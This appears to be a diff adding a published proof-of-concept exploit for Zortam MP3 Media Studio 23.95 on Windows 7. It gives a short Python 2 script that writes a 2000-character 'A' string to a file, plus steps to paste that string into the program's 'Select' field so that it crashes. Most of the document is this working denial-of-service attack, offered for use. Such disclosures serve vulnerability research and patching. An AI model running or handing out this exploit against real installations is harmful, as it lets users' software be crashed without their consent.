@@ -1,0 +1,25 @@
+# Exploit Title: Zortam MP3 Media Studio 23.95 - Denial of Service (PoC)
+# Author: Gionathan "John" Reale
+# Discovey Date: 2018-08-19
+# Homepage: https://www.zortam.com
+# Software Link: https://www.zortam.com/download.html
+# Tested Version: 23.95
+# Tested on OS: Windows 7 x64
+# Steps to Reproduce: Run the python exploit script, it will create a new 
+# file with the name "exploit.txt" just copy the text inside "exploit.txt"
+# and start the program. Once inside of the program click "Continue". In the new window paste the content of 
+# "exploit.txt" into the following field: "Select". Click "Ok" and you will see a crash.
+
+#!/usr/bin/python
+   
+buffer = "A" * 2000
+
+payload = buffer
+try:
+    f=open("exploit.txt","w")
+    print "[+] Creating %s bytes evil payload.." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
